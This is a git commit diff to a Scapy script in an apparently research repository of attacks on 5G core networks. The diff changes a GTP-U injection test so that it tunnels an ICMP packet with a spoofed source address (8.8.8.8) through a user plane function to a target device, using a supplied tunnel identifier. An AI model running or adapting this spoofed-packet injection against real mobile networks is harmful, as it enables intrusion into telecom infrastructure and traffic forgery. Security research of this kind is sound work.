bdf59725a670e8f782ba580108d3991aca431517
thoger <thomas.hoger@laas.fr>
2025-05-02 16:18:22 +0200

    Fix source IP address in GTP-U packet payload

--- src/attacks/upf_gtp/test.py
+++ src/attacks/upf_gtp/test.py
@@ -15,6 +15,7 @@ logger = Log("[GTP-U]")
 
 teid = int(sys.argv[1], 0)
 src_ip = "10.100.200.66"
+spoofed_ip = "8.8.8.8"
 ue_ip = sys.argv[2]
 upf_ip = "10.100.200.2"
 dport = 2152
@@ -26,11 +27,11 @@ logger.info(f"Interfaces: {get_if_list()}")
 arping(upf_ip)
 
 
-ip_payload = IP(src=src_ip, dst=ue_ip) / ICMP(type=8, id=0x1234, seq=1) / b"ABCDEFGHIJKLMNOPQRSTUVWX"
+ip_payload = IP(src=spoofed_ip, dst=ue_ip) / ICMP(type=8, id=0x1234, seq=1) / b"ABCDEFGHIJKLMNOPQRSTUVWX"
 
 gtpu_header = GTP_U_Header(teid=teid) / ip_payload
 
-packet = IP(dst=upf_ip) / UDP(dport=dport, sport=RandShort()) / gtpu_header
+packet = IP(src=src_ip, dst=upf_ip) / UDP(dport=dport, sport=RandShort()) / gtpu_header
 
 logger.info(f"Sending GTP-U packet with TEID {hex(teid)} to {ue_ip} through the upf ({upf_ip})")
 
